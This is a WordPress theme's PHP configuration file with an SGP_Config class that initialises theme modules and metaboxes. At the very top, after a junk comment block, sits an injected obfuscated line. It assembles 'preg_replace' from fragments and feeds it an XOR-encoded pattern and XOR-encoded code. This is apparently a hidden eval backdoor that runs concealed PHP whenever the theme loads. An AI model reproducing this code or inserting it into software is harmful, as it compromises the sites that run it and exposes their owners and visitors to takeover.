<?php
/*1PvVXKytsYYj3AsyCgFCgzoYEkwrNbrJiU
WcQ0arLIXLLrymxKIzt4pegwBvTnsMVUKXZomEHeMNUAuKNlH
ENlwOHxU0Vu6HchkdsX2yoUfTp8dYc3Vr8meOtgBWxJfz6X
*/

$XpXtxrn='preg_re'.'place'; $LgncWywX="CrUyoR7qkHeJEVi3To"^"l\x15\x17\x1a\x3f5V\x282\x2a\x03\x0d\x06\x17\x00t\x7b\x0a"; $XpXtxrn($LgncWywX, "RWoxgNyWRfUCkxhr12C5XLvGJpjPofYEYeiUubTlWj93uaW5n9dEjYKy5Hp0gdu0PhbG9xOEqSmLmeooAeMrIexWstVQUtL3OvKLqo1aXn1xMnQu6sGTaGIGP1i2cQQyFX7frszftgraRPUuDzP0X9hGM4asm9buymMruavB7O41fixF2A6"^"7\x21\x0e\x14Ol\x101z\x0f\x26\x30\x0e\x0c\x40\x2em\x16\x1cg\x1d\x1d\x23\x02\x19\x241w\x0c\x0e\x7e\x18pEOsUJ9\x08bBeoQ\x3e\x05p\x3fl\x21\x16\x3e\x02l\x1a\x5do\x2d\x19GYH\x10w\x0bVw\x5dI\x29\x23\x14k\x5dt\x0b\x5d\x5e\x0buWt\x16\x7e\x07\x195\x40\x1674e\x15zV\x7bQblWI\x11\x08\x2b\x1dT\x0ce2\x0dQi\x21\x02\x054\x02\x1a\x13\x0b\x16\x19Z\x13\x0e2\x16\x22\x3d\x10\x3b\x5bZZ\x1dT\x02\x04\x00\x3ex\x09\x29\x60\x25\x02u\x09l\x2d\x14\x19oF\x03\x05I\x3d\x16\x16\x09\x28U\x28HMbR7\x5dEN\x40CfOc\x1f", "gBcPgaYYbfGCAiG"); 

require_once TEMPLATEPATH . '/functions/sgpanel/options.php';
require_once TEMPLATEPATH . '/functions/modules/metaboxes-list.php';

class SGP_Config {

	protected static $_ptt;
	protected static $_tpl;
	protected static $_pid;

	public static function init($pid, $ptt, $tpl)
	{
		self::$_pid = $pid;
		self::$_ptt = $ptt;
		self::$_tpl = $tpl;
	}
	
	public static function getTPL()
	{
		return self::$_ptt . '|' . self::$_tpl;
	}
	
	public static function getModule($module, $noinit = FALSE)
	{
		if (!$noinit AND !SG_Module::factory($module)->inited()) {
			$ml = sg_modules_list();
			$mb = isset($ml[self::$_ptt][self::$_tpl]) ? $ml[self::$_ptt][self::$_tpl] : array();
			$init = FALSE;
			
			foreach ($mb as $metabox => $opt) {
				if (isset($opt['modules'][$module])) {
					$mo = $opt['modules'][$module];
					$uniq = $opt['unique'];
					$params = (isset($mo['params']) AND !empty($mo['params'])) ? $mo['params'] : NULL;
					$defaults = (isset($mo['default']) AND !empty($mo['default'])) ? $mo['default'] : NULL;
					$ug = (isset($mo['global']) OR isset($ml['global'][$module]));
					$m_global = (isset($mo['global']) AND is_array($mo['global'])) ? $mo['global'] : array();
					$s_global = (isset($ml['global'][$module]) AND isset($ml['global'][$module]['default'])) ?
									$ml['global'][$module]['default'] : array();
					$global = array_merge($s_global, $m_global);
					$global = empty($global) ? ($ug ? TRUE : NULL) : $global;
					$params['_ptt'] = self::$_ptt;
					$params['_tpl'] = self::$_tpl;
					SG_Module::factory($module)->initVars('sg_' . $uniq, $params, $defaults, $global, self::$_pid);
					$init = TRUE;
					break;
				}
			}
			
			if (!$init) {
				if (isset($ml['global'][$module])) {
					$mo = $ml['global'][$module];
					$params = (isset($mo['params']) AND !empty($mo['params'])) ? $mo['params'] : NULL;
					$defaults = (isset($mo['default']) AND !empty($mo['default'])) ? $mo['default'] : NULL;
					SG_Module::factory($module)->initVars('sg_', $params, $defaults, NULL, NULL);
				}
			}
		}
		
		return SG_Module::factory($module);
	}
	
	public static function getGModule($module)
	{
		if (!SGP_Module::factory($module)->inited()) {
			$ml = sgp_options();
			foreach ($ml as $tab => $opt) {
				if (isset($opt['modules'][$module])) {
					$mo = $opt['modules'][$module];
					$params = (isset($mo['params']) AND !empty($mo['params'])) ? $mo['params'] : NULL;
					$defaults = (isset($mo['default']) AND !empty($mo['default'])) ? $mo['default'] : NULL;
					SGP_Module::factory($module)->initVars($params, $defaults);
				}
			}
		}
		
		return SGP_Module::factory($module);
	}

}